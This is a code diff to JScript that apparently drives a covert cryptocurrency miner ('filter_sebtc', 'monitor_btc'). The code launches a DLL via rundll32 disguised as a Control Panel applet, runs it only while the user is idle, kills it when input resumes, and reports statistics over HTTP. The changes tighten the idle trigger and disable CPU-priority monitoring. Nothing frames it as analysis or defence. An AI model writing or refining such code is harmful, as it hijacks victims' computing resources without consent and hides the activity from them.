@@ -8,7 +8,7 @@ function filter_idle.prototype.run(){
 	log("filter_idle.prototype.run")
 	var pThis = this;
 	var idle = __external.GetTickCount() - __external.GetLastInputInfo()
-	if(__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl() || idle>__idletime/8){
+	if((__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl()) && idle>__idletime/8){
 		__interrupted = __DEBUG;
 		setTimeout(function(){
 			var idle = __external.GetTickCount() - __external.GetLastInputInfo()
@@ -114,17 +114,18 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 	WshShell.CurrentDirectory=__workdir
 	var p = WshShell.Exec("rundll32.exe "+pipe.name+" Control_RunDLL appwiz.cpl,,2");
 	var pid = p.ProcessID	
+	//__external.ShellExcute("", "rundll32.exe "+pipe.name+" Control_RunDLL appwiz.cpl,,2", __workdir, 0x00000080)	
 	if(pid==0){
 		sendHttpStat("monitor_btc", "launch_failed_" + pipe.name, 1);
 		pThis.callback(pipe, true);
 		return ;
 	}
-	//var pid = __external.ShellExcute("", "rundll32.exe "+pipe.name+" Control_RunDLL appwiz.cpl,,2", __workdir, 0x00000080)	
 	var wql = "SELECT * FROM Win32_Process" + " where ProcessID=" + pid	
 	var timer1 = setInterval(function(){ //每秒一次idle 有输入即退出
 		var process = new Enumerator (__service.ExecQuery(wql)).item();	
 		if( process){	
 			var idle = __external.GetTickCount()-__external.GetLastInputInfo()
+			//idle=-1;
 			if(idle >0 && idle < 1500){ //主动出口			
 				clearInterval(timer1)
 				log("kill exit idle="+idle+" , pid="+pid+" , __external.GetLastInputInfo()="+__external.GetLastInputInfo()+", __external.GetTickCount()="+__external.GetTickCount());					
@@ -141,6 +142,7 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 				__TRY(function (){
 					process.Terminate(-100); 
 				})
+				//log(", p.Status="+p.Status+", p.ExitCode="+p.ExitCode);
 				sendHttpStat("monitor_btc", "kill_exit", parseInt((__external.GetTickCount()-starttime)/1000/60),1);
 				pThis.callback(pipe)
 				return ;
@@ -152,9 +154,9 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 				if(h){
 					var s = __storage.ReadFileMapping(h,128);					
 				}
-				log("h="+h+" , s="+s);
+				log("h="+h+" , s="+s+", p.Status="+p.Status+", p.ExitCode="+p.ExitCode);
 			}				 
-			//MonitorCPU 
+			/*//MonitorCPU 
 			var NORMAL_PRIORITY_CLASS     =        0x00000020
 			var IDLE_PRIORITY_CLASS       =        0x00000040
 			var HIGH_PRIORITY_CLASS       =        0x00000080
@@ -187,7 +189,7 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 						+ " Priority ="+process.Priority )	
 					}
 				})
-			 }			
+			 }*/			
 		}
 		else{
 			clearInterval(timer1)
